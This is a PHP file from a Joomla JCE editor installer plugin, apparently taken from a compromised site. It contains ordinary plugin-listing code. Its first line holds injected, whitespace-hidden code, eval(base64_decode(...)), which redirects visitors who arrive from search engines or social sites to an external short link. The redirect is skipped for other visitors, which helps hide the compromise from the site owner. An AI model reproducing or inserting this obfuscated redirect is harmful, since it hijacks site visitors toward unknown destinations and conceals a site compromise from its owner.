<?php	                                       			eval(base64_decode("DQplcnJvcl9yZXBvcnRpbmcoMCk7DQokbmNjdj1oZWFkZXJzX3NlbnQoKTsNCmlmICghJG5jY3Ypew0KJHJlZmVyZXI9JF9TRVJWRVJbJ0hUVFBfUkVGRVJFUiddOw0KJHVhPSRfU0VSVkVSWydIVFRQX1VTRVJfQUdFTlQnXTsNCmlmIChzdHJpc3RyKCRyZWZlcmVyLCJ5YWhvbyIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImJpbmciKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJyYW1ibGVyIikgb3Igc3RyaXN0cigkcmVmZXJlciwiZ29nbyIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImxpdmUuY29tIilvciBzdHJpc3RyKCRyZWZlcmVyLCJhcG9ydCIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsIm5pZ21hIikgb3Igc3RyaXN0cigkcmVmZXJlciwid2ViYWx0YSIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImJlZ3VuLnJ1Iikgb3Igc3RyaXN0cigkcmVmZXJlciwic3R1bWJsZXVwb24uY29tIikgb3Igc3RyaXN0cigkcmVmZXJlciwiYml0Lmx5Iikgb3Igc3RyaXN0cigkcmVmZXJlciwidGlueXVybC5jb20iKSBvciBwcmVnX21hdGNoKCIveWFuZGV4XC5ydVwveWFuZHNlYXJjaFw/KC4qPylcJmxyXD0vIiwkcmVmZXJlcikgb3IgcHJlZ19tYXRjaCAoIi9nb29nbGVcLiguKj8pXC91cmxcP3NhLyIsJHJlZmVyZXIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsIm15c3BhY2UuY29tIikgb3Igc3RyaXN0cigkcmVmZXJlciwiZmFjZWJvb2suY29tIikgb3Igc3RyaXN0cigkcmVmZXJlciwiYW9sLmNvbSIpKSB7DQppZiAoIXN0cmlzdHIoJHJlZmVyZXIsImNhY2hlIikgb3IgIXN0cmlzdHIoJHJlZmVyZXIsImludXJsIikpewkJDQoJCWhlYWRlcigiTG9jYXRpb246IGh0dHA6Ly90aW55dXJsLmNvbS9hNDJzamN3Iik7DQoJCWV4aXQoKTsNCgl9DQp9DQp9"));
/**
 * @version		$Id: plugin.php 47 2009-05-26 18:06:30Z happynoodleboy $
 * @package		Joomla
 * @subpackage	Menus
 * @copyright	Copyright (C) 2005 - 2008 Open Source Matters. All rights reserved.
 * @license		GNU/GPL, see LICENSE.php
 * Joomla! is free software. This version may have been modified pursuant to the
 * GNU General Public License, and as distributed it includes or is derivative
 * of works licensed under the GNU General Public License or other free or open
 * source software licenses. See COPYRIGHT.php for copyright notices and
 * details.
 */

// Import library dependencies
require_once(dirname(__FILE__).DS.'extensions.php');

/**
 * Installer Plugins Model
 *
 * @package		Joomla
 * @subpackage	Installer
 * @since		1.5
 */
class InstallerModelPlugin extends InstallerModel
{
	/**
	 * Extension Type
	 * @var	string
	 */
	var $_type = 'plugin';

	/**
	 * Overridden constructor
	 * @access	protected
	 */
	function __construct()
	{
		global $mainframe;

		// Call the parent constructor
		parent::__construct();

		// Set state variables from the request
		$this->setState('filter.string', $mainframe->getUserStateFromRequest( "com_jce.plugin.string", 'filter', '', 'string' ));
	}

	function _loadItems()
	{
		global $mainframe, $option;

		// Get a database connector
		$db = & JFactory::getDBO();

		$where = null;
		if ($search = $this->_state->get('filter.string')) {
			$where .= ' AND title LIKE '.$db->Quote( '%'.$db->getEscaped( $search, true ).'%', false );
		}

		$query = 'SELECT id, title, type, name' .
				' FROM #__jce_plugins' .
				' WHERE type="plugin"' .
				' AND iscore=0' .
				$where .
				' ORDER BY name';
		$db->setQuery($query);
		$rows = $db->loadObjectList();

		// Get the plugin base path
		$baseDir = JPATH_PLUGINS .DS. 'editors' .DS. 'jce' .DS. 'tiny_mce' .DS. 'plugins';

		$numRows = count($rows);
		for ($i = 0; $i < $numRows; $i ++) {
			$row = & $rows[$i];

			// Get the plugin xml file
			$xmlfile = $baseDir .DS. $row->name .DS. $row->name .".xml";

			if (file_exists($xmlfile)) {
				if ($data = JApplicationHelper::parseXMLInstallFile($xmlfile)) {
					foreach($data as $key => $value)
					{
						$row->$key = $value;
					}
				}
			}
		}

		$this->setState('pagination.total', $numRows);
		if($this->_state->get('pagination.limit') > 0) {
			$this->_items = array_slice( $rows, $this->_state->get('pagination.offset'), $this->_state->get('pagination.limit') );
		} else {
			$this->_items = $rows;
		}
	}
}